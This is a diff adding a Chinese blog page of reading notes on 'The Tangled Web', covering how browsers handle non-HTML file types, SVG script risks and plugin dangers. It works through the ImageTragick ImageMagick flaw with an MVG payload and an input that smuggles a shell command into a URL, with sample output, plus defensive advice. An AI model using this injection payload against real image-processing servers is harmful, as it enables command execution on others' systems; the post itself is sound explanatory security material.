@@ -1,0 +1,150 @@
+<html>
+<head>
+	
+	<title>非HTML类型文档的复仇以及插件 -- 《The Tangled Web》</title>
+	<meta name="keywords" content="Just do, Just for fun" />
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+    <!--<link rel="stylesheet" href="/css/main.css" type="text/css">
+-->
+	<link href="/css/main.css?v=2" rel="stylesheet" type="text/css" />
+    <!--<link rel="stylesheet" href="/css/style.css" type="text/css">
+-->
+    
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">
+
+    
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2"/>
+    
+
+</head>
+
+<body>
+
+<h1 id="非HTML类型文档的复仇以及插件">非HTML类型文档的复仇以及插件</h1>
+<p>除了HTML文档，浏览器还可以识别其他若干的文件格式，而这些文件格式，在大多数情况风险比较低，但是在某些时候，会冒出致命的危险，接下来会说的一个最近刚刚曝出的漏洞。</p>
+<h2 id="纯文本文件">纯文本文件</h2>
+<p>Content-Type: text/plain</p>
+<p>除了IE，收到没有头域的HTTP/0.9 或者缺少Content-Type 的响应，默认是处理为纯文本文件，而IE会处理为HTML 文件。同时，大多数浏览器，对若干的MIME 类型，及其各种变种，text/CSS 都映射为纯文本文件，是为了方便开发人员，当然，JSON除外。</p>
+<h2 id="位图图片">位图图片</h2>
+<p>在缺少Content-Type 响应头的情况下，会有解析器去检测文档的头部信息，来判断类型。如果包含了Content-Type类型，那么先匹配到MIME 类型，如果无法解析，就会再检测文档头部信息，来确定类型。</p>
+<p>而近期曝出的ImageMagick 的0day 漏洞，就是这样一个漏洞，漏洞发生在这款ImageMagick 的图像处理软件，它被广泛用来在网站上进行图像处理，其原理就是，用户上传图像，每个图像会有一个magic bytes，实际上就是文件头，用来表示图像类型，ImageMagick 的功能就是通过解析器，对文件头进行解析，然后进一步处理。</p>
+<p>如果我们把一个含有恶意代码的文件保存为文件格式，交给ImageMagick 解析，正常是ImageMagick 无法解析的，当然漏洞就是不正常的时候了，参考如下代码：</p>
+<figure class="highlight javaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line"></div><div class="line">viewbox <span class="number">0</span> <span class="number">0</span> <span class="number">640</span> <span class="number">480</span></div><div class="line"></div><div class="line">fill ‘url(https:<span class="comment">//example.com/image.jpg“|ls “-la)’</span></div><div class="line"></div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+
+<p>将其保存为jpg 格式等，调用ImageMagick 去处理它，就会触发一个最常见的查看本地文件的漏洞，下面在说一下原因。</p>
+<p>ImageMagick 在 MagickCore/constitute.c 的 ReadImage 函数中解析图片，如果图片地址是 https:// 开头的，即调用 InvokeDelegate。MagickCore/delegate.c 定义了委托。作为一个执行命令被引入的，但是，对参数的引入没有做好足够的过滤，造成了渗透的可能，比如一个默认命令是为了处理来自http 请求送来的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"wget"</span> -q -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></div></pre></td></tr></table></figure>
+
+<p>此处的%M 是真实的输入参数，如果他的值是这样的:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`https://example.com<span class="string">";|ls "</span>-la`</div></pre></td></tr></table></figure>
+
+<p>很显然，由于引号的奇怪闭合方式，这一块恰好满足了bash 的语法，通过一个通道符，我们继续调用了ls -la ，显然，这就引起了注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ convert <span class="string">'https://example.com";|ls "-la'</span> out.png</div><div class="line">total <span class="number">32</span></div><div class="line">drwxr-xr-x <span class="number">6</span> user group <span class="number">204</span> Apr <span class="number">29</span> <span class="number">23</span>:<span class="number">08</span> .</div><div class="line">drwxr-xr-x+ <span class="number">232</span> user group <span class="number">7888</span> Apr <span class="number">30</span> <span class="number">10</span>:<span class="number">37</span> ..</div></pre></td></tr></table></figure>
+
+<p>这是基本的原因，实际上的利用漏洞过程通过上传文件，构造exploit, 上文中已经构造了一个文件，他的格式是按照mvg 格式，对于ImageMigick 存在这种漏洞的有两个格式，mvg,和svg,mvg 相对好构造一点。</p>
+<p>更进一步的，通过构造exploit ，我们可以删除服务器文件，移动服务器文件，或者是读取服务器文件，其结果，你懂得。</p>
+<p>具体参见这个漏洞专门成立的网站<a href="https://imagetragick.com/" target="_blank" rel="external">Imagetragick</a>, 如今在乌云上，借着这个漏洞，已经提交了无数个0day 漏洞了。</p>
+<h2 id="音视频文件">音视频文件</h2>
+<p>其细节内容，不做过多的深究，对于其安全隐患，也就是是否合理的消除类型错判带来的风险，和上边的图片处理有一点点相似。</p>
+<p>另外，作者想了一个很有想象力的情况，如果<audio> 支持未压缩的原生音频播放，然后这个标签被指向了敏感的非音频文件，但是由于是处在这个标签下，还是会被当做原生的音频播放，虽然是混乱的声波。而在HTML5 之下，调用麦克风API，可以捕捉这些声波信息，通过这些声波信息，又重组了文件内容。OTZ…</audio></p>
+<h2 id="XML_文件">XML 文件</h2>
+<p>浏览器会根据收到的Content-Type 或一些其他线索，为集中特殊的XML 格式提供单一用途的XML 解析器。而绝大部分时候，和XHTML 同一个解析器。在XML 中，</p>
+<ul>
+<li>文档的实际含义取决于XML 文件中的xmlns 命名空间</li>
+<li>xmlns 和 Content-Type 的值无关，按后者进行解析</li>
+<li>可能有多个xmlns,对文档的每个段落赋予不同的含义</li>
+</ul>
+<h4 id="常规的XML_视图">常规的XML 视图</h4>
+<p>如果没有能够识别的命名空间设定，那么浏览器会默认显示一种树状结构，如果有的话，就按照实际含义进行显示。</p>
+<p>但由于这种需要显示未知用途和无法识别命名空间的XML 文档，会带来一定的容错，这种容错，可能导致XSS，比如代理未经过滤的RSS 订阅源，一般来说是有特定的解析器进行处理，但如果没有内置RSS 阅读功能的浏览器，可能会使用最常规的解析模式，而RSS 订阅源中可能存在有HTML 代码，造成XSS 漏洞。</p>
+<h4 id="可缩放向量图片">可缩放向量图片</h4>
+<p>这里所说的一般是SVG，在上一部分的那个例子里，已经探讨过SVG带来的灾难，一个常见的svg 表达方式如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">xmlns</span>=<span class="value">"http://www.w3.org/2000/svg"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">&lt;![CDATA[</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">clicked</span><span class="params">()</span> </span>{alert(<span class="string">"hello"</span>);}</div><div class="line">]]&gt;<span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">circle</span> <span class="attribute">onclick</span>=<span class="value">"clicked()"</span> <span class="attribute">cx</span>=<span class="value">"50"</span> <span class="attribute">cy</span>=<span class="value">"50"</span> <span class="attribute">r</span>=<span class="value">"50"</span> <span class="attribute">fill</span>=<span class="value">"pink"</span> /&gt;</span><span class="tag">&lt;/<span class="title">svg</span>&gt;</span></div></pre></td></tr></table></figure>
+
+
+<p>目前该特性已被绝大多数浏览器支持，这里的svg是完成了一个划出圆圈，同时在圆圈中点击会显示提示信息。</p>
+<p>对于svg来说，这种格式的图片可以直接放在独立的XML 文档中被访问到，同时也可以放在第三方页面上用&lt; img&gt;引用到，而使用img的话，svg的脚本部分会被完全禁止掉，但是虽然会被禁止，但是还是有危险的，他所在的内置脚本仍然有可能获得图片所在域名的上下文环境权限并且执行，所以如果引入外部来源的svg,就一定要做好非常严谨的语法过滤，上文提到的ImageMagick 漏洞，就是因为在处理图片头的时候，没有做好过滤造成的。</p>
+<p>除此之外，还有一些其他类型的文档，比如<strong>数学标记语言</strong>， <strong>XML用户界面语言</strong>， <strong>无线标记语言</strong>，<strong>RSS Atom订阅源</strong> 等等。</p>
+<p>另外，还有一些不可显示的文件类型，如插件和扩展的安装清单列表，manifests,自动HTTP代理配置歘繁忙PAC，可安装的外观样式，整数撤销列表CRL，反恶意网站黑名单等等。</p>
+<h3 id="安全工程">安全工程</h3>
+<p>当需要处理的数据很可能被解析为XHTML 格式，或其他支持脚本的文档类型，不要只去根据Content-Type 响应头和最顶层的xmlns 指令来判断。同时不要再任意位置上允许出现可由用户控制的标记语言。</p>
+<p>如果不需要直接访问该文件，可以在响应的响应头加上<strong>Content-Disposition:Attachment</strong>。</p>
+<p>对于非HTML 类型文档，正确识别Content-Type响应头，同时正确设置字符集编码，也很重要。</p>
+<h1 id="浏览器插件">浏览器插件</h1>
+<p>浏览器插件林林总总，形态各异。简单来讲，一个常见的插件，是讲在浏览器中显示一种新型的文件格式，格式类似于HTML，浏览器得到后交给插件进行处理。</p>
+<p>很容易可以想到，浏览器插件的安全漏洞，不仅多，而且千奇百怪，可以说针对Web 应用程序的攻击，与插件占有关系占了很大一部分。</p>
+<p>对插件的调用通过几个显式的形式调用：</p>
+<ul>
+<li>标记 &lt; object data=…&gt; 这样的形式，或者是&lt; embed src=…&gt;.</li>
+<li>type 参数，将type的参数的MIME 与浏览器里注册的有效插件的MIME类型做一个对比，如果匹配，就把它传给谍影的插件如理，如果没有匹配，理论上会出现窗口，提示用户下载，但某些时候，浏览器会根据Content-Type头域，或者URL 里文件后缀的方式猜测。</li>
+<li>插件里的输入信息一般通过&lt; object&gt; 区块里嵌入&lt; param&gt; 标签来进行设置。</li>
+</ul>
+<p>这里我们要强调的是，在对插件Content-Type 处理时是存在风险的，若干插件实际上有自己完整的代码执行环境，而且这些可执行的应用在于他们所在源站点进行交互时拥有一系列的特权，就很容易出现CSRF 的跨站漏洞。比如已经被启用的&lt; applet&gt;标签，可用于加载java 小程序。GIFAR 漏洞在2008年诞生，就是用一个applet 中加载的java程序，偷偷的隐藏在一个GIF 图片中。</p>
+<p><strong>插件的各种应用框架</strong></p>
+<p>这其中藏着无数的坑待挖掘，这里只是个小引子~</p>
+<ul>
+<li>Flash ,不多说，如今越来越不受待见其中存在有严重的脚本注入等问题，如getURL() navigateToURL() 控制浏览器打开访问新窗口等等，他还拥有一些特殊技能，这些特殊技能都有着致命的危险：<ul>
+<li>收集字体等系统识别特征</li>
+<li>可以全屏，所以可以制作UI 欺诈</li>
+<li>能得到麦克风和摄像头的数据</li>
+<li>能忽略浏览器的安全和隐私设定，使用自己的安全设置进行数据持久化</li>
+<li>默认情况下，可以直接使用浏览器的HTTP 堆栈及其管理的全局身份凭证信息。</li>
+<li>可以和其他运行的Flash 交互</li>
+<li>访问应用页的DOM 元素</li>
+<li>FLash 自带内部简化版HTML 解析器，转义等等问题要注意</li>
+<li>插件自身的设计问题等等等等等等等等等等</li>
+</ul>
+</li>
+<li>Microsoft Sliverlight ,不懂，有机会接触的时候再详细理解吧。</li>
+<li>Sun java,&lt; applet&gt; 已经因为严重的问题被抛弃了。</li>
+<li>XML Browser Applications ，微软家的不怎么懂，同上上。</li>
+<li>ActiveX Controls ,一度很火，如今几乎挂了，不过IE8之前，你懂得，黑客的天堂。</li>
+</ul>
+<h2 id="安全工程-1">安全工程</h2>
+<p>提供需要让插件处理的文件时：</p>
+<ul>
+<li>对于来源信任的数据，还是应当避免处理用户提供的URL，也不要在小程序中产生或者试图修改用户控制的HTML。</li>
+<li>对于用户控制的简单的多媒体，记得要验证文件格式，甚至是限制文件格式，使用正确的Content-Type 设置，同时要吸取各种前车之鉴，避免内容检测造成的漏洞。</li>
+<li>用户控制的文档格式，虽然本质上是可以绝对安全，但是插件仍然有漏洞的可能，所以对于文档，两个解决办法，专用域名，单词有效的令牌，不要持久cookie.</li>
+</ul>
+<p>对于需要嵌入由插件处理的文件，无外乎就是确保type 参数明确，如果无法被识别的话，一定要做出各种限制，任何非信任站点来的东西，都不要随便接收，做好对设置的核查。</p>
+<p>开发ActiveX 组件？放弃吧！</p>
+<hr>
+<p>由于对浏览器插件这一块不熟，而且感觉这里边有一些有趣的文章可以做，但作者又讲的很少，而且大多数是一些行将就木的过时插件的东西，所以这里我就简短的写了写。</p>
+<p>至此，所有关于Web 的东西基本上结束了，回顾整个过程，我们会发现，在Web 中，存在的漏洞一方面是由于本身在协议阶段就存在不科学的地方，另一方面在浏览器等客户端在实现过程中，又由于各自为战，也存在有不统一和各自的缺陷存在，还有一个原因，就是开发者自己在开发中，并不懂自己写出来的代码会带来什么样的困扰，这大概是最可怕的，同时，由于客户端的真正操作者是对程序对代码一窍不通的人，在安全风险上，完全不能依赖他们去提供一点点的阻挡。</p>
+<p>所以，一个真正想要构建安全环境的产品，是需要一个团队在整个流程里，能准确把握所有可能造成安全问题的隐患，用最稳妥的方式处理。渗透不可怕，可怕的是每次只有当渗透发生了之后，仅仅明白哪里出错，而不知道为什么会出错，为什么会被黑客抓住。</p>
+<p>所以，真正的安全者，是对自己的产品每一块防护措施都了如指掌的人。 </p>
+
+
+<!--<a href="http://yoursite.com/2016/05/07/非HTML类型文档的复仇以及插件-《The-Tangled-Web》/#disqus_thread" class="article-comment-link">Comments</a>-->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'null'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<div style="display:none">
+<script src="http://s4.cnzz.com/stat.php?id=undefined&web_id=undefined" language="JavaScript"></script>script>
+</div>
+
+
+
+
+
+
+
+</body>
+</html>
